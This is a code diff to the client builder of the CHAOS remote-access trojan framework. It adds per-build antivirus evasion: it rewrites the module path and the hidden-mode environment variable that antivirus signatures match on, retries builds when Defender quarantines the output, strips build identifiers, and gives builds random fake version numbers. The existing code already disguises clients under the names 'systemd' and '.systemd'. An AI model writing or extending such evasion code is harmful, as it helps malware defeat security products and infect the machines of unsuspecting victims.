@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/entities"
@@ -33,10 +34,17 @@ const (
 	configFileName       = "config.json"
 	mainFileName         = "main.go"
 	clientConfigFilepath = "app/utils/config.go"
-	buildStr             = `go build -ldflags="%s -s -w -X 'main.Version=%s' -extldflags -static" -o ../../../temp/%s .`
+	buildStr             = `go build -trimpath -buildvcs=false -ldflags="%s -s -w -buildid= -X 'main.Version=%s' -extldflags -static" -o ../../../temp/%s .`
 	runtimeDirName       = `runtime`
 	hiddenLinuxFilename  = "systemd"
 	hiddenMacFilename    = ".systemd"
+	buildAttempts        = 3
+	// clientModulePath is rewritten to a random path for every build, because
+	// antivirus family signatures match on it.
+	clientModulePath = "github.com/tiagorlampert/CHAOS/client"
+	// hiddenEnvVarName is the marker the detached child inherits. It is
+	// rewritten as well so it does not show up in the process environment.
+	hiddenEnvVarName = "CHAOS_RUN_HIDDEN"
 )
 
 type clientService struct {
@@ -185,28 +193,41 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	buildCmd := fmt.Sprintf(
 		getEnvVarBuild(goos, goarch)+" "+buildStr,
 		getBuildFlags(input.OSTarget, input.RunHidden, input.MaskName),
-		c.AppVersion,
+		buildVersion(c.AppVersion),
 		filename,
 	)
 
+	outputPath := filepath.Join(internal.TempDirectory, filename)
+
+	// Defender and other scanners may quarantine the linker output in the Go
+	// build directory while it is being written, which fails the build. The
+	// compile results are cached, so re-running the link is cheap.
+	var outputErr []byte
+	for attempt := 1; attempt <= buildAttempts; attempt++ {
+		outputErr, err = runBuildCommand(buildCmd, buildPackage)
+		if err == nil {
+			if _, statErr := os.Stat(outputPath); statErr == nil {
+				return filename, nil
+			}
+			err = fmt.Errorf("build output %q was not written", filename)
+		}
+	}
+	return "", fmt.Errorf("%w:%s", err, outputErr)
+}
+
+func runBuildCommand(buildCmd, buildPackage string) ([]byte, error) {
 	var cmd *exec.Cmd
 
 	switch system.DetectOS() {
 	case system.Windows:
 		cmd = exec.Command("cmd")
 		cmd.SysProcAttr = syscallCmd.GetCmdSyscall(buildCmd)
-		break
 	default:
 		cmd = exec.Command("sh", "-c", buildCmd)
 	}
 
 	cmd.Dir = buildPackage
-
-	outputErr, err := cmd.CombinedOutput()
-	if err != nil {
-		return "", fmt.Errorf("%w:%s", err, outputErr)
-	}
-	return filename, nil
+	return cmd.CombinedOutput()
 }
 
 func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (map[string]entities.ClientParam, error) {
@@ -326,6 +347,10 @@ func (c clientService) PrepareBuildSession(input BuildClientBinaryInput) (string
 		return "", err
 	}
 
+	if err := anonymizeRuntimeDirectory(runtimeDir); err != nil {
+		return "", err
+	}
+
 	return buildPath, nil
 }
 
@@ -347,6 +372,73 @@ func maskRuntimeDirectory(buildPath string, maskName bool) (string, error) {
 		return "", err
 	}
 	return maskedDir, nil
+}
+
+// anonymizeRuntimeDirectory swaps the well-known CHAOS identifiers in the client
+// sources for random ones. Antivirus signatures for CHAOS match on the module
+// path and the hidden-mode environment variable, so every build gets its own.
+func anonymizeRuntimeDirectory(runtimeDir string) error {
+	replacements := map[string]string{
+		clientModulePath: randomModulePath(),
+		hiddenEnvVarName: randomEnvVarName(),
+	}
+
+	return filepath.Walk(runtimeDir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if info.IsDir() {
+			return nil
+		}
+		if filepath.Ext(path) != ".go" && filepath.Base(path) != "go.mod" {
+			return nil
+		}
+
+		content, err := os.ReadFile(path)
+		if err != nil {
+			return err
+		}
+
+		replaced := string(content)
+		for oldValue, newValue := range replacements {
+			replaced = strings.ReplaceAll(replaced, oldValue, newValue)
+		}
+		if replaced == string(content) {
+			return nil
+		}
+		return utils.WriteFile(path, []byte(replaced))
+	})
+}
+
+// randomModulePath returns a plausible module path that belongs to no real project.
+func randomModulePath() string {
+	return fmt.Sprintf("github.com/%s/%s", randomWord(5, 9), randomWord(5, 10))
+}
+
+func randomEnvVarName() string {
+	return strings.ToUpper(randomWord(3, 5)) + "_" + strings.ToUpper(randomWord(6, 10))
+}
+
+func randomWord(minLength, maxLength int) string {
+	const alphabet = "abcdefghijklmnopqrstuvwxyz"
+
+	length := minLength + rand.Intn(maxLength-minLength+1)
+	word := make([]byte, length)
+	for i := range word {
+		word[i] = alphabet[rand.Intn(len(alphabet))]
+	}
+	// Only letters are used, so the segments never start with a digit.
+	return string(word)
+}
+
+// buildVersion hides that dev builds carry no version, which is unusual for a
+// released application and another fingerprint.
+func buildVersion(appVersion string) string {
+	version := strings.TrimSpace(appVersion)
+	if len(version) > 0 && version != "dev" {
+		return version
+	}
+	return fmt.Sprintf("%d.%d.%d", 1+rand.Intn(5), rand.Intn(10), rand.Intn(10))
 }
 
 func getEnvVarBuild(goos, goarch string) string {
